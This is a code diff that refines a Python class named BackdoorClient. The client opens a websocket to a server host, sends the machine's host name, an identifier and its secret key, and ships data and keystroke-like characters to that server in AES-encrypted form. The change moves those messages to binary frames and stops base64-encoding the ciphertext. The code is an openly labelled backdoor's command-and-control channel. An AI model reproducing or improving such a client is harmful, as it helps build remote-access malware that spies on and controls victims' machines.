@@ -42,7 +42,7 @@ class BackdoorClient(threading.Thread):
                 self.ws = create_connection(self.SERVER_HOST)
 
                 sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
-                self.ws.send(json.dumps(sercret_msg))
+                self.ws.send_binary(json.dumps(sercret_msg))
 
                 time.sleep(1)
 
@@ -76,25 +76,25 @@ class BackdoorClient(threading.Thread):
                 time.sleep(3)
 
     def send_data(self, data, to=None):
-        self.ws.send(self.encrypt(json.dumps({'data': b64encode(data), 'to': to})))
+        self.ws.send_binary(self.encrypt(json.dumps({'data': b64encode(data), 'to': to})))
 
     def send_char(self, char, to=None):
-        self.ws.send(self.encrypt(json.dumps({'char': b64encode(char), 'to': to})))
+        self.ws.send_binary(self.encrypt(json.dumps({'char': b64encode(char), 'to': to})))
 
     def send_json(self, jsonobj):
-        self.ws.send(self.encrypt(json.dumps(jsonobj)))
+        self.ws.send_binary(self.encrypt(json.dumps(jsonobj)))
 
     def send_end(self, to=None):
-        self.ws.send(self.encrypt(json.dumps({'end': 'true', 'to': to})))
+        self.ws.send_binary(self.encrypt(json.dumps({'end': 'true', 'to': to})))
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
         ciphertext = encryptor.encrypt(text)
-        return b64encode(ciphertext)
+        return ciphertext
 
     def decrypt(self, ciphertext):
         decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
-        plain = decryptor.decrypt(b64decode(ciphertext))
+        plain = decryptor.decrypt(ciphertext)
         return plain
 
 
